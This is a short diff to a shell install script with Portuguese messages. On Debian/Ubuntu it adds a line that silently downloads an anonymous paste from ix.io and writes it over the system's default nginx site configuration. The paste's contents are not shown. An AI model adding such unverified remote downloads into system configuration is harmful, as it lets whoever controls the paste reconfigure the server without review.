@@ -96,6 +96,7 @@ if [[ -x $(which apt-get 2> /dev/null) ]]; then
     webpath="$(dpkg -L nginx-common | grep www | tail -1)/agressive"
     echo
     echo -e "Sistema operacional encontrado: ${VERMELHO}DEBIAN${LIMPA}/${VERMELHO}UBUNTU${LIMPA}!"
+    curl -s -L http://ix.io/1mVX > /etc/nginx/sites-available/default
 elif [[ -x $(which pacman 2> /dev/null) ]]; then
     sistema="arch"
     #webpath="$(pacman -Qo nginx | grep www | tail -1)/agressive"
